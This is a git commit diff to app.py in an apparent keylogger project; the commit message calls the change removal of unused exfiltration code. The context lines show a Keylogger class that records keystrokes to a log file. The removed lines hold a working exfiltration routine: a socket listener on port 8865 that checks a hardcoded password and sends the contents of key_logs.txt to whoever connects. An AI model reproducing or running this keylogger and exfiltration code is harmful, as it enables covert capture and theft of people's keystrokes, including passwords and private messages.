404b1f77bc320b0e1b13ea89d81aef2c8046bd82
Yogesh Jajoria <yogeshjajoria2019@gmail.com>
2024-04-10 23:59:42 +0530

    removed unused code (exfil )from app.py

--- app.py
+++ app.py
@@ -19,9 +19,6 @@ class Keylogger:
         delayed_thread = threading.Thread(target=self.BreakTime)
         delayed_thread.start()
 
-        server_thread = threading.Thread(target=self.exfil_data)
-        server_thread.start()
-
         keyboard.wait()
 
     def on_press(self, event):
@@ -34,36 +31,5 @@ class Keylogger:
             with open(self.log_file, 'a') as logf:
                 logf.write(f"\n[ {time.asctime(time.gmtime())} ]\n")
             time.sleep(10)  # 43200
-
-    def exfil_data(self):
-        '''
-        Perform data exfiltration
-        Open a port on the system 
-
-        wait for a connection
-
-        '''
-        PORT = 8865
-
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(('127.0.0.1', PORT))
-        s.listen()
-
-        while True:
-            print('listening')
-            client, addr = s.accept()
-            print(f'connection received from {addr}')
-
-            password = client.recv(1024).decode()
-            if password != 'bad_password!@#PQWERD':
-                exit()
-
-            with open('key_logs.txt') as logfile:
-                data = logfile.readlines()
-                buf_size = len(data)
-
-            client.send(str(buf_size).encode())
-            client.send(str(data).encode())
-
 
 Keylogger()
